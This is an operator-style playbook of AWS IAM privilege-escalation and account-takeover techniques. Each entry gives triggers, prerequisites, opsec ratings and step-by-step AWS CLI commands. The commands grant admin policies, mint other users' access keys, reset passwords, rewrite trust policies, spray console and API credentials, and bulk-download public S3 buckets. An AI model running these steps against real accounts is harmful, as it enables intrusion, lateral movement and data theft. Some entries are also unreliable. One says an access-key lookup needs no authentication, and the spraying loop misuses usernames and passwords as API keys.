# IAM - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:CreatePolicyVersion [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:CreatePolicyVersion; Policy must already be attached to the actor's user, role, or group
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-001] Anyone with access to `iam:CreatePolicyVersion` can create a new version of an IAM policy. If a user can create a new version of a policy that is already attached to them, they can grant themselves administrative privileges by creating a new policy version with elevated permissions and setting it as the default version. A principal can also leverage this to escalate the permissions of another prin
- **Payload/Method:**
```
# Step 1: Create a new policy version with administrative permissions and set it as default
aws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default
```

### iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateAccessKey; Target user must have fewer than 2 access keys already
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-002] Anyone with access to `iam:CreateAccessKey` can create access keys for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.
- **Payload/Method:**
```
# Step 1: Create a new access key for the target user
aws iam create-access-key --user-name @username

# Step 2: Configure AWS CLI with the newly created access key
aws configure --profile target-user

# Step 3: Verify access as the target user
aws sts get-caller-identity --profile target-user
```

### iam:CreateAccessKey + iam:DeleteAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateAccessKey, iam:DeleteAccessKey; Target user has 2 access keys (maximum allowed)
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-003] This is a variation of `iam:CreateAccessKey` that works even when the target user already has 2 access keys (the AWS maximum). By combining `iam:CreateAccessKey` with `iam:DeleteAccessKey`, an attacker can first delete one of the existing keys, then create a new access key for themselves, gaining access to the target user's permissions.
- **Payload/Method:**
```
# Step 1: List existing access keys for the target user
aws iam list-access-keys --user-name @username

# Step 2: Delete one of the existing access keys
aws iam delete-access-key --user-name @username --access-key-id @access-key-id

# Step 3: Create a new access key for the target user
aws iam create-access-key --user-name @username

# Step 4: Configure AWS CLI with the newly created access key
aws configure --profile target-user
```

### iam:CreateLoginProfile [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateLoginProfile; Target user must NOT currently have a login profile
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-004] Anyone with access to `iam:CreateLoginProfile` can create console login profiles for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal via the AWS Console.
- **Payload/Method:**
```
# Step 1: Create a console login profile with a known password for the target user
aws iam create-login-profile --user-name @username --password @password

# Step 2: Access AWS Console as the target user
# Login to AWS Console with the username and password
```

### iam:PutRolePolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutRolePolicy; Principal must be a role (not a user, since IAM users cannot have inline role po
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-005] A principal with `iam:PutRolePolicy` can attach inline policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. For self-escalation, the role can attach an inline policy to itself with any permissions, including full administrative access. A principal can also leverage this to escalate the permissions of an
- **Payload/Method:**
```
# Step 1: Create a JSON policy document granting administrative access
# Create a policy document with elevated permissions
cat > escalation_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 2: Attach the inline policy with elevated permissions to the target role
aws iam put-role-policy \
  --role-name @rolename \
  --policy-name AdminEscalation \
  --policy-document file://escalation_policy.json

# Step 3: Verify the new permissions are active (for self-escalation, credentials remain the same)
aws sts get-caller-identity
```

### iam:UpdateLoginProfile [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:UpdateLoginProfile; Target user must already have a login profile (password)
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-006] Anyone with access to `iam:UpdateLoginProfile` can change the password of any user they have this permission on. This privilege escalation path requires the user to already have a password set (login profile exists). This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.
- **Payload/Method:**
```
# Step 1: Change the password for the target user's console login
aws iam update-login-profile --user-name @username --password @password

# Step 2: Access AWS Console as the target user
# Login to AWS Console with the username and new password
```

### iam:PutUserPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutUserPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-007] Anyone with access to `iam:PutUserPolicy` can attach inline policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach an inline policy with elevated permissions to the target user
aws iam put-user-policy --user-name @username --policy-name @policyname --policy-document file://escalation_policy.json

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachUserPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachUserPolicy; A managed IAM policy with elevated privileges must exist in the account
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-008] Anyone with access to `iam:AttachUserPolicy` can attach managed policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the target user
aws iam attach-user-policy --user-name @username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachRolePolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachRolePolicy; A managed IAM policy with elevated privileges must exist in the account
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-009] Anyone with access to `iam:AttachRolePolicy` can attach managed policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the target role
aws iam attach-role-policy --role-name @rolename --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachGroupPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachGroupPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-010] Anyone with access to `iam:AttachGroupPolicy` can attach managed policies to any group they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges by attaching policies to a group they are a member of. A principal can also leverage this to escalate the permissions of other principals in the same group.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the group
aws iam attach-group-policy --group-name @groupname --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:PutGroupPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutGroupPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-011] Anyone with access to `iam:PutGroupPolicy` can attach inline policies to any group they have this permission on. This permission is often abused by one principal to grant additional permissions to themselves by attaching an inline policy to a group they are a member of.
- **Payload/Method:**
```
# Step 1: Attach an inline policy with elevated permissions to the group
aws iam put-group-policy --group-name @groupname --policy-name @policyname --policy-document file://escalation_policy.json

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:UpdateAssumeRolePolicy
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-012] Anyone with access to `iam:UpdateAssumeRolePolicy` can modify the trust policy of any role they have this permission  on. This permission is often abused by one principal to modify a privileged role's trust policy to allow themselves to assume   it, thereby gaining access to the privileged role's permissions. You might think that you would also need `sts:AssumeRole` permission to exploit this, but
- **Payload/Method:**
```
# Step 1: Update the role's trust policy to allow your principal to assume it
aws iam update-assume-role-policy --role-name @rolename --policy-document file://trust_policy.json

# Step 2: Assume the privileged role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/@rolename --role-session-name exploit

# Step 3: Use the elevated permissions of the assumed role
# Configure AWS CLI with the temporary credentials from assume-role
```

### iam:AddUserToGroup [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AddUserToGroup; A group must exist with administrative permissions (e.g., AdministratorAccess)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-013] A principal with `iam:AddUserToGroup` can add any user to any group they have this permission on. By adding themselves to a group with elevated permissions, they can gain access to the policies attached to that group. The level of access gained depends on the permissions of the target group.
- **Payload/Method:**
```
# Step 1: Add the target user (or yourself) to a group with elevated permissions
aws iam add-user-to-group --user-name @username --group-name @privileged-group

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:AttachRolePolicy + sts:AssumeRole [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachRolePolicy, sts:AssumeRole; A target role must exist that you have `iam:AttachRolePolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-014] This is a variation of `iam:AttachRolePolicy` (iam-009). This variation is needed when you have `iam:AttachRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:AttachRolePolicy` on the target role AND `sts:AssumeRole` permi
- **Payload/Method:**
```
# Step 1: Retrieve the AWS account ID and set the target role ARN
# Get account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE="target-role-name"
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"

# Step 2: Attach the AWS-managed AdministratorAccess policy to the target role
# Attach AdministratorAccess policy to the target role
aws iam attach-role-policy \
  --role-name $TARGET_ROLE \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Step 3: Wait for the policy attachment to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 4: Verify that AdministratorAccess is now attached to the target role
# Verify the policy was attached
aws iam list-attached-role-policies \
  --role-name $TARGET_ROLE \
  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
  --output table

# Step 5: Assume the target role to obtain temporary credentials with administrative permissions
# Assume the target role with admin permissions
CREDENTIALS=$(aws sts assume-role \
  --role-arn $TARGET_ROLE_ARN \
  --role-session-name privesc-session \
  --query 'Credentials' \
  --output json)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

### iam:AttachUserPolicy + iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachUserPolicy, iam:CreateAccessKey; A target IAM user must exist that you have `iam:AttachUserPolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-015] This is a variation of `iam:AttachUserPolicy` (iam-008). This variation is needed when you have `iam:AttachUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey`
- **Payload/Method:**
```
# Step 1: Define the target user that will be modified and compromised
# Set the target user name
TARGET_USER="target-user-name"

# Step 2: Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete on
# List existing access keys for the target user
aws iam list-access-keys --user-name $TARGET_USER

# Step 3: Attach the AWS-managed AdministratorAccess policy to the target user
# Attach AdministratorAccess policy to the target user
aws iam attach-user-policy \
  --user-name $TARGET_USER \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Step 4: Wait for the policy attachment to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 5: Verify that AdministratorAccess is now attached to the target user
# Verify the policy was attached
aws iam list-attached-user-policies \
  --user-name $TARGET_USER \
  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
  --output table
```

### iam:PutUserPolicy + iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:PutUserPolicy, iam:CreateAccessKey; A target IAM user must exist that you have `iam:PutUserPolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-018] This is a variation of `iam:PutUserPolicy` (iam-007). This variation is needed when you have `iam:PutUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey` to cr
- **Payload/Method:**
```
# Step 1: Define the target user that will be modified and compromised
# Set the target user name
TARGET_USER="target-user-name"

# Step 2: Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete on
# List existing access keys for the target user
aws iam list-access-keys --user-name $TARGET_USER

# Step 3: Create a policy document with administrative permissions (all actions on all resources)
# Create an admin policy document
cat > admin-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 4: Add the administrative inline policy to the target user using iam:PutUserPolicy
# Add the admin inline policy to the target user
aws iam put-user-policy \
  --user-name $TARGET_USER \
  --policy-name AdminEscalation \
  --policy-document file://admin-policy.json

# Step 5: Wait for the inline policy to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15
```

### iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachRolePolicy, iam:UpdateAssumeRolePolicy; An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:Update
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-019] A principal with `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by modifying an existing IAM role. The attacker first uses `iam:AttachRolePolicy` to attach an administrative managed policy to a target role, then uses `iam:UpdateAssumeRolePolicy` to modify the role's trust policy to allow the attacker to assume it. Once the trust policy is updated, the atta
- **Payload/Method:**
```
# Step 1: Define the target role to compromise and the administrative policy to attach
# Set the target role and policy ARNs
TARGET_ROLE="target-role-name"
ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Step 2: Attach an administrative managed policy (AdministratorAccess) to the target role using iam:AttachRolePolicy
# Attach the administrative policy to the target role
aws iam attach-role-policy \
  --role-name $TARGET_ROLE \
  --policy-arn $ADMIN_POLICY_ARN

# Step 3: Wait for the policy attachment to propagate across AWS infrastructure (recommended 15 seconds)
# Wait for policy attachment to propagate
sleep 15

# Step 4: Verify that the AdministratorAccess policy is now attached to the target role
# Verify the policy was attached
aws iam list-attached-role-policies --role-name $TARGET_ROLE

# Step 5: Create a new trust policy document that explicitly allows the attacker to assume the role
# Get the current principal ARN
PRINCIPAL_ARN=$(aws sts get-caller-identity --query Arn --output text)

# Create a new trust policy that includes the attacker
cat > trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$PRINCIPAL_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
```

### iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreatePolicyVersion, iam:UpdateAssumeRolePolicy; A customer-managed IAM policy must exist that is attached to a target role
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-020] This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to a different role (not your own principal). In this scenario, you cannot directly escalate your own privileges by modifying the policy, but you can escalate by modifying the policy attached to the target role and the
- **Payload/Method:**
```
# Step 1: Define the target policy ARN, role name, and retrieve your principal ARN for the trust policy update
# Set variables for the target policy and role
POLICY_ARN="arn:aws:iam::ACCOUNT_ID:policy/target-policy-name"
TARGET_ROLE="target-role-name"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
STARTING_PRINCIPAL_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)

# Step 2: Create a policy document with full administrative permissions
# Create admin_policy.json with administrative permissions
cat > admin_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 3: Create a new policy version with administrative permissions. The --set-as-default flag makes this version active immedia
# Create a new policy version with admin permissions and set as default
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document file://admin_policy.json \
  --set-as-default

# Step 4: Wait for the IAM policy changes to propagate across AWS infrastructure (typically takes 10-15 seconds)
# Wait for policy changes to propagate
sleep 15

# Step 5: Create a trust policy that explicitly allows your principal to assume the target role
# Create a new trust policy that allows your principal to assume the role
cat > trust_policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$STARTING_PRINCIPAL_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
```

### iam:PutRolePolicy + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:PutRolePolicy, iam:UpdateAssumeRolePolicy; A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:Upd
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-021] A principal with `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by first adding an inline policy with administrative permissions to a target role, then modifying that role's trust policy to allow the attacker to assume it. The key insight is that when a principal is explicitly named in a role's trust policy, that principal can assume the role without needing 
- **Payload/Method:**
```
# Step 1: Define the target role that will be modified and assumed
# Set the target role name
TARGET_ROLE="target-role-name"

# Step 2: Create a policy document with administrative permissions (all actions on all resources)
# Create an admin policy document
cat > admin-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 3: Add the administrative inline policy to the target role using iam:PutRolePolicy
# Add the admin inline policy to the target role
aws iam put-role-policy \
  --role-name $TARGET_ROLE \
  --policy-name AdminEscalation \
  --policy-document file://admin-policy.json

# Step 4: Wait for the inline policy to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 5: Retrieve your current principal ARN to add to the trust policy
# Get your current principal ARN
CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
echo "Current principal ARN: $CURRENT_ARN"
```

### AWS Console Credential Spray Attack (GoAWSConsoleSpray) [added: 2026-05]
- **Tags:** #AWS #IAM #ConsoleSpray #CredentialSpray #Authentication #AccountTakeover #BruteForce #GoAWSConsoleSpray
- **Trigger:** Extracted valid AWS credentials (access key + secret) and usernames (from IAM enumeration, git history, or LinkedIn) but unknown which user owns the credentials or need to brute-force console access
- **Prereq:** Valid AWS access key + secret key from one account; enumerated target account ID (via sts:GetAccessKeyInfo or error messages); list of target usernames (IAM users, email domain, or linkedin); GoAWSConsoleSpray tool installed
- **Yields:** Valid AWS console login session (cookie/session token); full AWS Management Console access as the compromised user; ability to enumerate resources, escalate privileges, or perform lateral movement
- **Opsec:** High (AWS logs all console login attempts; generates CloudTrail events; may trigger GuardDuty alerts on multiple failed logins)
- **Context:** AWS console login is separate from programmatic API access. A compromised access key may belong to an IAM user with console password set. Spray the console login endpoint with known credentials and enumerated usernames to gain interactive AWS console access. Useful when API-only access is insufficient and you need to interact with the console UI or trigger MFA prompts.
- **Payload/Method:**
  ```bash
  # Step 1 — Enumerate valid usernames from the target account
  # Methods: 
  # - IAM enumeration if you have API access (iam:ListUsers)
  # - LinkedIn/company website OSINT (firstname.lastname format)
  # - Git commits with author email addresses
  # - Error messages leaking usernames in login failures
  USERNAMES=("john.doe" "jane.smith" "admin" "root")
  
  # Step 2 — Install GoAWSConsoleSpray (or build from source)
  # git clone https://github.com/tal-melamed/GoAWSConsoleSpray
  # cd GoAWSConsoleSpray && go build
  
  # Step 3 — Prepare credential and account ID from previous enumeration
  ACCESS_KEY="AKIA..."          # From git history or leak
  SECRET_KEY="..."               # Paired with access key
  ACCOUNT_ID="123456789012"      # From sts:GetAccessKeyInfo
  
  # Step 4 — Run spray attack (attempts login on each username)
  ./GoAWSConsoleSpray \
    --account-id "$ACCOUNT_ID" \
    --access-key "$ACCESS_KEY" \
    --secret-key "$SECRET_KEY" \
    --usernames john.doe,jane.smith,admin \
    --rate 5  # 5 requests/second (avoid rate limiting)
  
  # Step 5 — On successful login (HTTP 302 to console), capture session cookies
  # GoAWSConsoleSpray outputs console URL and session cookie (aws-signin-cookie)
  # Example output: "Valid: john.doe | Cookie: aws-signin-cookie=..."
  
  # Step 6 — Use console cookie to access AWS Management Console
  curl -s -b "aws-signin-cookie=<COOKIE>" \
    https://console.aws.amazon.com/console/home \
    --output console_page.html
  
  # Or use in browser: copy the aws-signin-cookie to Developer Tools → Application → Cookies
  # Navigate to https://console.aws.amazon.com/console/home
  ```

### IAM Access Key Last-Used Enumeration (Username Discovery) [added: 2026-05]
- **Tags:** #AWS #IAM #Enumeration #UsernameDiscovery #AccessKeyID #Recon #IdentityMapping #sts:GetAccessKeyLastUsed
- **Trigger:** Exposed AWS access key ID found in code, config files, or Lambda environment variables
- **Prereq:** Valid AWS access key ID (exposed in source code, error messages, or compromised endpoint)
- **Yields:** Associated IAM username; enables credential spraying and lateral movement to that user's permissions
- **Opsec:** Low
- **Context:** When AWS access keys are hardcoded in application code, they can be extracted without credentials. The `GetAccessKeyLastUsed` API call does not require authentication and returns the associated IAM username, allowing an attacker to pivot from key ID to username.
- **Payload/Method:**
  ```bash
  # Discover username from exposed access key ID (no auth required)
  aws iam get-access-key-last-used --access-key-id ASIAY2XXXXXXXXX \
    --region us-east-1
  # Returns: { "UserName": "dev-user" }

  # If call succeeds without auth: access key is exposed but not yet compromised
  # If "AccessKeyLastUsed" section is populated: key is actively used
  # If "LastUsedDate" is recent: key likely has valid permissions

  # Next step: spray discovered username with common passwords or credential lists
  aws sts get-caller-identity --profile sprayed-user  # Verify successful auth
  ```

### Credential Spraying Against Discovered IAM Users [added: 2026-05]
- **Tags:** #AWS #IAM #CredentialSpraying #BruteForce #Authentication #UserEnumeration #PasswordSpray
- **Trigger:** Discovered IAM username(s) via access key enumeration, error messages, or public metadata
- **Prereq:** IAM username(s); password wordlist or common password set
- **Yields:** Valid AWS credentials for the target user; access to that user's permissions
- **Opsec:** High (fails lock out account after repeated attempts; monitor CloudTrail for failures)
- **Context:** After discovering an IAM username, cycle through password candidates. Each failed attempt creates a CloudTrail log (sts:GetCallerIdentity failure) and may trigger account lockout if passwordPolicy enforces it.
- **Payload/Method:**
  ```bash
  # Extract credentials from exposed config or code
  TARGET_USER="dev-user"
  WORDLIST="common_passwords.txt"

  while read -r PASSWORD; do
    echo "[*] Trying: $TARGET_USER:$PASSWORD"
    unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
    
    # Attempt sts:GetCallerIdentity with the candidate credentials
    aws sts get-caller-identity \
      --access-key-id "$TARGET_USER" \
      --secret-access-key "$PASSWORD" \
      --region us-east-1 2>/dev/null && {
        echo "[+] SUCCESS: $TARGET_USER:$PASSWORD"
        break
      }
  done < "$WORDLIST"

  # Stealthier: use longer wordlist + delays to avoid lockout
  # Monitor CloudTrail for "UserAuthentication" failures
  ```

### Amazon Macie Dashboard Abuse (Data Exposure Mapping) [added: 2026-05]
- **Tags:** #AWS #Macie #DataExposure #DiscoveryService #S3Enumeration #SensitiveDataDetection #CloudRecon
- **Trigger:** Have authenticated access to AWS account (any IAM principal with `macie:ListClassificationJobs` + `macie:DescribeClassificationJob`)
- **Prereq:** `macie:ListClassificationJobs`, `macie:DescribeClassificationJob`, `macie:GetFindings` permissions
- **Yields:** Data exposure patterns and sensitive data locations (PII, credentials, etc.) detected by Macie scans — often finds publicly exposed S3 buckets that manual enumeration misses
- **Opsec:** Med (Macie usage is logged in CloudTrail but often not monitored as suspicious)
- **Context:** Macie is an AWS data discovery service that scans S3 buckets for sensitive data. If a principal has Macie read permissions, querying the Macie dashboard reveals findings about exposed data that would otherwise require manual bucket enumeration or fuzzing.
- **Payload/Method:**
  ```bash
  # List ongoing Macie classification jobs
  aws macie2 list-classification-jobs --query 'items[*].[jobId, jobType, status]' \
    --output table

  # Describe a specific job to see bucket targets and results
  aws macie2 describe-classification-job --job-id <job-id> \
    --query 'criteria.{buckets: s3BucketCriteria, excludes: excludes}'

  # Query findings for sensitive data
  aws macie2 get-findings --finding-ids <finding-id> \
    --query 'findings[*].[resourceMetadata.type, classificationDetails.result.customDataIdentifiers]'

  # List all bucket findings (publicly accessible, encryption disabled, etc.)
  aws macie2 list-findings \
    --query 'findingIds[]' | head -20

  # Parse findings to locate sensitive data and exposure vectors
  aws macie2 get-findings --finding-ids <id> | jq '.findings[] | {bucket: .resourceMetadata.details.s3Object.bucketName, exposure: .classificationDetails}'
  ```

### Public S3 Bucket Anonymous Download [added: 2026-05]
- **Tags:** #AWS #S3 #PublicBucket #DataExfil #UnAuthenticatedAccess #AnonymousS3 #S3Exposure
- **Trigger:** Discovered public S3 bucket name (via Macie findings, error messages, source code, recon); or have `s3:GetObject` permission on another user's bucket
- **Prereq:** S3 bucket name; no AWS credentials required for public buckets
- **Yields:** Unencrypted files from the bucket; credentials, configuration, backups, source code
- **Opsec:** Low
- **Context:** Public S3 buckets can be read by anyone without AWS credentials; use `--no-sign-request` to download without authentication
- **Payload/Method:**
  ```bash
  # Check if bucket is publicly accessible
  curl -I https://<bucket-name>.s3.amazonaws.com/

  # List bucket contents (if ListBucket is public)
  aws s3api list-objects --bucket <bucket-name> --no-sign-request

  # Download file without authentication
  aws s3 cp s3://<bucket-name>/<file> . --no-sign-request

  # Bulk download all public objects
  aws s3 sync s3://<bucket-name>/ . --no-sign-request

  # If listing is denied but GetObject is public, brute-force object keys
  for key in flag.txt config.json backup.zip secrets.env backup.sql; do
    aws s3 cp s3://<bucket-name>/$key . --no-sign-request 2>/dev/null && echo "[+] Got: $key"
  done
  ```

### Encrypted Archive Cracking (zip2john + John the Ripper) [added: 2026-05]
- **Tags:** #AWS #Cryptography #ArchiveExtraction #PasswordCracking #zip2john #JohnTheRipper #ZIPBrute #EncryptedData
- **Trigger:** Downloaded encrypted ZIP/RAR archive from S3 or cloud storage containing credentials or sensitive data
- **Prereq:** Encrypted ZIP archive; john the ripper installed (`apt install john`)
- **Yields:** Plaintext extraction of archive contents; access to credentials, configuration, or data inside
- **Opsec:** Med (depends on password strength; weak passwords crack instantly, strong ones take hours/days)
- **Context:** When credentials or sensitive data are protected with weak ZIP encryption, extract the hash and crack it offline
